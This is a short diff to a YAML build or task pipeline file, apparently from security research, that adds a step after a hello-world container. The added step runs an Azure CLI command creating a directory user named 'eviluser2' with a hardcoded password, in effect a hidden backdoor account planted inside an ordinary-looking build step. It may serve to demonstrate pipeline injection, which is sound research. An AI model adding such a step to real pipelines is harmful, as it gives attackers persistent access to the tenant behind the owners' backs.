@@ -1,3 +1,4 @@
 version: v1.1.0
 steps:
   - cmd: mcr.microsoft.com/hello-world
+  - cmd: az ad user create --display-name eviluser2 --password p@ssword!123 --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com
